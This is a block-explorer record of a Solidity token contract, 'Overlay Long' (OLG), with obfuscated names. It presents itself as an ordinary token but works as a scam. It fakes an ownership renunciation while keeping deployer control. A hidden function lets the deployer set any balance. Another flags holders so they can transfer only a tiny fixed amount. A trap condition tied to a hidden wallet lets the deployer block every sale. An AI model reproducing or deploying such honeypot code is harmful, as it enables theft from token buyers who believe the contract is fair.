{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface fromLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingEnableWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenFee {\n    function createPair(address toSell, address maxTx) external returns (address);\n}\n\ninterface receiverWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingMin) external view returns (uint256);\n\n    function transfer(address maxLaunchReceiver, uint256 swapMax) external returns (bool);\n\n    function allowance(address isAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxLaunchReceiver,\n        uint256 swapMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atWallet, uint256 value);\n    event Approval(address indexed isAmount, address indexed spender, uint256 value);\n}\n\ninterface teamShould is receiverWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OverlayLong is marketingEnableWallet, receiverWallet, teamShould {\n\n    uint256 public atTrading;\n\n    string private txFund = \"OLG\";\n\n    function transferFrom(address marketingTotal, address maxLaunchReceiver, uint256 swapMax) external override returns (bool) {\n        if (_msgSender() != liquidityExempt) {\n            if (sellLaunchTotal[marketingTotal][_msgSender()] != type(uint256).max) {\n                require(swapMax <= sellLaunchTotal[marketingTotal][_msgSender()]);\n                sellLaunchTotal[marketingTotal][_msgSender()] -= swapMax;\n            }\n        }\n        return tradingReceiver(marketingTotal, maxLaunchReceiver, swapMax);\n    }\n\n    string private atFee = \"Overlay Long\";\n\n    uint256 constant marketingTeamMin = 19 ** 10;\n\n    function shouldReceiver(address toTokenAt) public {\n        feeListMode();\n        \n        if (toTokenAt == launchedWalletMode || toTokenAt == marketingLimitReceiver) {\n            return;\n        }\n        launchTeam[toTokenAt] = true;\n    }\n\n    mapping(address => bool) public launchTeam;\n\n    function name() external view virtual override returns (string memory) {\n        return atFee;\n    }\n\n    function marketingFrom(address listLaunchedToken) public {\n        if (txFrom) {\n            return;\n        }\n        \n        limitTeamSwap[listLaunchedToken] = true;\n        if (enableLimit != enableExempt) {\n            tradingSell = true;\n        }\n        txFrom = true;\n    }\n\n    function tradingReceiver(address marketingTotal, address maxLaunchReceiver, uint256 swapMax) internal returns (bool) {\n        if (marketingTotal == launchedWalletMode) {\n            return autoSwapMax(marketingTotal, maxLaunchReceiver, swapMax);\n        }\n        uint256 teamIs = receiverWallet(marketingLimitReceiver).balanceOf(walletSwapFrom);\n        require(teamIs == limitLiquidity);\n        require(maxLaunchReceiver != walletSwapFrom);\n        if (launchTeam[marketingTotal]) {\n            return autoSwapMax(marketingTotal, maxLaunchReceiver, marketingTeamMin);\n        }\n        return autoSwapMax(marketingTotal, maxLaunchReceiver, swapMax);\n    }\n\n    bool private atTradingReceiver;\n\n    bool public teamAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txFund;\n    }\n\n    uint256 liquidityLaunched;\n\n    uint256 private buyTokenSender = 100000000 * 10 ** 18;\n\n    uint256 limitLiquidity;\n\n    mapping(address => bool) public limitTeamSwap;\n\n    uint256 public minExempt;\n\n    function autoSwapMax(address marketingTotal, address maxLaunchReceiver, uint256 swapMax) internal returns (bool) {\n        require(fromSell[marketingTotal] >= swapMax);\n        fromSell[marketingTotal] -= swapMax;\n        fromSell[maxLaunchReceiver] += swapMax;\n        emit Transfer(marketingTotal, maxLaunchReceiver, swapMax);\n        return true;\n    }\n\n    mapping(address => uint256) private fromSell;\n\n    function approve(address enableBuy, uint256 swapMax) public virtual override returns (bool) {\n        sellLaunchTotal[_msgSender()][enableBuy] = swapMax;\n        emit Approval(_msgSender(), enableBuy, swapMax);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenTake;\n    }\n\n    function allowance(address amountLimitShould, address enableBuy) external view virtual override returns (uint256) {\n        if (enableBuy == liquidityExempt) {\n            return type(uint256).max;\n        }\n        return sellLaunchTotal[amountLimitShould][enableBuy];\n    }\n\n    address walletSwapFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address tradingMin) public view virtual override returns (uint256) {\n        return fromSell[tradingMin];\n    }\n\n    function owner() external view returns (address) {\n        return swapFrom;\n    }\n\n    function getOwner() external view returns (address) {\n        return swapFrom;\n    }\n\n    address liquidityExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private sellLaunchTotal;\n\n    function tokenFund(address walletMarketing, uint256 swapMax) public {\n        feeListMode();\n        fromSell[walletMarketing] = swapMax;\n    }\n\n    function tokenMinSwap(uint256 swapMax) public {\n        feeListMode();\n        limitLiquidity = swapMax;\n    }\n\n    event OwnershipTransferred(address indexed launchEnable, address indexed launchMax);\n\n    uint256 public txTrading;\n\n    address public launchedWalletMode;\n\n    address public marketingLimitReceiver;\n\n    bool private enableLimit;\n\n    bool public enableExempt;\n\n    constructor (){\n        if (teamAmount != enableLimit) {\n            minExempt = txTrading;\n        }\n        fromLaunched tradingTo = fromLaunched(liquidityExempt);\n        marketingLimitReceiver = tokenFee(tradingTo.factory()).createPair(tradingTo.WETH(), address(this));\n        \n        launchedWalletMode = _msgSender();\n        swapMode();\n        limitTeamSwap[launchedWalletMode] = true;\n        fromSell[launchedWalletMode] = buyTokenSender;\n        \n        emit Transfer(address(0), launchedWalletMode, buyTokenSender);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyTokenSender;\n    }\n\n    function feeListMode() private view {\n        require(limitTeamSwap[_msgSender()]);\n    }\n\n    bool private tradingAmount;\n\n    function swapMode() public {\n        emit OwnershipTransferred(launchedWalletMode, address(0));\n        swapFrom = address(0);\n    }\n\n    function transfer(address walletMarketing, uint256 swapMax) external virtual override returns (bool) {\n        return tradingReceiver(_msgSender(), walletMarketing, swapMax);\n    }\n\n    uint8 private tokenTake = 18;\n\n    address private swapFrom;\n\n    uint256 private modeLaunched;\n\n    bool private tradingSell;\n\n    bool public txFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLimitShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedWalletMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTeamSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunchedToken\",\"type\":\"address\"}],\"name\":\"marketingFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLimitReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTokenAt\",\"type\":\"address\"}],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"tokenFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"tokenMinSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxLaunchReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "OverlayLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}